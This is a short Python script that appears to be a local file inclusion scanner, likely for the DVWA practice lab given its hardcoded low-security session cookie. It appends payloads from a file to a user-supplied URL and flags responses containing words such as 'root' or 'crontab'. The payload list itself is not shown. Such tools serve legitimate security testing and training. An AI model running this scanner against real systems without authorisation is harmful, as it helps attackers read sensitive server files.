import requests
import sys
import time

def lfi_func():
    url=input("\nEnter Target URL : ")
    payload = "payload/Payloads_lfi.txt"
    words = ['root','version','crontab','host','log']
    cookies = {'security' : 'low', 'PHPSESSID':'ev5mlspqdiklrgaqfqbh00act0'}
    f=open(payload)
    for i in f.readlines():
        ur=requests.get(url+'{}'.format(i),cookies=cookies)
        if any(s in ur.content.decode("utf-8") for s in words):
            print(( ' [Detect LFI]------->   '+'  Payload is  '+str(i)))
            time.sleep(1)
            print("You can test with",url,str(i))
        else:
            print("Not found vulnerability with your payloads!")
    print("Scan Complete")

if __name__ == "__main__":
    lfi_func()

        

